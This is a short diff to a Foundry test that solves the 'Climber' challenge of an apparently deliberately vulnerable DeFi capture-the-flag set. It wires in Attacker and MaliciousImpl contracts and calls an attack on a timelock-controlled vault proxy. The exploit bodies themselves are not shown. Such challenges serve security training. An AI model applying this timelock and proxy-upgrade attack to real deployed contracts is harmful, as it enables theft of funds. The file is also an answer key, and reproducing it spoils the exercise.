@@ -8,6 +8,9 @@ import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 
+import "./Attacker.sol";
+import "./MaliciousImpl.sol";
+
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -85,7 +88,9 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        Attacker attacker = new Attacker();
+        MaliciousImpl impl = new MaliciousImpl();
+        attacker.attack(timelock, ERC1967Proxy(payable(address(vault))), impl, token, recovery);
     }
 
     /**
